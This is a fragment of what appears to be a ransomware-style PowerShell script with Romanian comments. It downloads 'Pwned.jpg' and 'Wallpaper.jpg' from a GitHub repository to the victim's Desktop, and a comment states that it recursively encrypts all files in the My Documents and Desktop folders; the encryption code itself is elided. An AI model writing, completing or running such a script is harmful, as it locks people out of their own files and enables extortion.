...
$url = "https://github.com/wbtlgn/Demo/blob/main/Pwned.jpg"
$output = "$env:USERPROFILE\Desktop\Pwned.jpg"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $output)

# Descarca imaginea Wallpaper.jpg
$url = "https://github.com/wbtlgn/Demo/blob/main/Wallpaper.jpg"
...
# Cripteaza recursiv toate fisierele din folderele "My Documents" si "Desktop", precum si toate subfolderele
